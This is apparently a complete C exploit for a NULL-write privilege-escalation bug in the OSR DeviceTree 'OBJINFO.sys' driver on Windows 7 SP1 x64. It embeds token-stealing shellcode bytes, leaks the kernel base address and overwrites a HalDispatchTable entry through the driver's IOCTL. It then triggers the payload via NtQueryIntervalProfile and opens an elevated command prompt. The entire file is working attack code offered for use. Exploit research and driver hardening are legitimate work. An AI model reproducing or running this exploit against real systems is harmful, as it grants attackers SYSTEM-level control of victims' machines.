#include "exploit.h"
#include "leak_utilities.h"

unsigned char assembly[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	HANDLE device_handle = CreateFileA(TARGET_DEVICE, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0); // GENERIC_READ | GENERIC_WRITE doesn't work..?
	HINSTANCE nt_dll_handle = LoadLibraryA(NT_DLL_LOCATION);

	unsigned long long base_address = 0ULL;
	unsigned long long truncated_function_address = 0ULL;

	// I hate this shit help
	PVOID allocation = (void*)0;
	SIZE_T region_size = 4096;

	long status = 0L;

	DEVICE_INPUT device_input;
	unsigned char output_buffer[8];
	unsigned long bytes_returned = 0UL, interval = 0UL;
	NtQueryIntervalProfile _NtQueryIntervalProfile = 0;
	NtAllocateVirtualMemory _NtAllocateVirtualMemory = 0;

	unsigned char unused = 0;

	RtlSecureZeroMemory(output_buffer, sizeof(output_buffer));
	RtlSecureZeroMemory(&device_input, sizeof(device_input));

	SetConsoleTitleA("DeviceTree Exploit");
	printf("[*] OSR DeviceTree \"OBJINFO.sys\" Write NULL Elevation of Privilege Vulnerability\n[*] Exploit written by Niko\n[!] Let's exploit!");

	if (device_handle == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"%s\" device. Error: %d (0x%x)", TARGET_DEVICE, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" device. Handle Value: 0x%p", TARGET_DEVICE, device_handle);

	if (!nt_dll_handle)
	{
		printf("\n[-] Failed to obtain a handle to \"%s\" library. Error: %d (0x%x)", NT_DLL_LOCATION, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" library. Handle Value: 0x%p", NT_DLL_LOCATION, device_handle);

	_NtQueryIntervalProfile = GetProcAddress(nt_dll_handle, "NtQueryIntervalProfile");
	if (!_NtQueryIntervalProfile)
	{
		printf("\n[-] Failed to locate the \"NtQueryIntervalProfile\" exported function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtQueryIntervalProfile\" exported function. Function Address: 0x%p", _NtQueryIntervalProfile);

	_NtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(nt_dll_handle, "NtAllocateVirtualMemory");
	if (!_NtAllocateVirtualMemory)
	{
		printf("\n[-] Failed to locate the \"NtAllocateVirtualMemory\" exported function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtAllocateVirtualMemory\" exported function. Function Address: 0x%p", _NtAllocateVirtualMemory);

	if (!(base_address = leak_ntoskrnl_base_address(nt_dll_handle)))
	{
		return 1;
	}

	truncated_function_address = base_address + HAL_HALIQUERYSYSTEMINFORMATION_WIN7_SP1_X64_OFFSET;
	truncated_function_address &= 0xFFFF;
	allocation = (PVOID)truncated_function_address;
	printf("\n[+] Calculated the truncated address for the \"HaliQuerySystemInformation\" function. Truncated Address: 0x%llx", truncated_function_address);

	status = _NtAllocateVirtualMemory(GetCurrentProcess(), &allocation, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status)
	{
		printf("\n[-] Failed to allocate kernel payload memory. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated kernel payload memory. Allocation Address: 0x%p", allocation);

	memcpy(allocation, assembly, sizeof(assembly));
	printf("\n[+] Prepared the kernel payload.");

	device_input.Address = base_address + NT_HALDISPATCHTABLE_WIN7_SP1_X64_OFFSET + 2;
	device_input.Size = 6;
	printf("\n[+] Crafted the input structure.\n<---------------- | Entering Danger Zone | ---------------->");
	Sleep(1000);

	DeviceIoControl(device_handle, TARGET_IOCTL, &device_input, sizeof(device_input), output_buffer, 8, &bytes_returned, 0);
	printf("\n[!] Triggered NULL overwrite.");
	Sleep(500);

	_NtQueryIntervalProfile(2, &interval);
	printf("\n[!] Triggered execution of kernel payload.\n<---------------- | Leaving Danger Zone | ---------------->");
	Sleep(1000);

	system("start C:\\Windows\\System32\\cmd.exe");
	printf("\n[+] Exploitation completed successfully.");
	unused = getchar();

	return 0;
}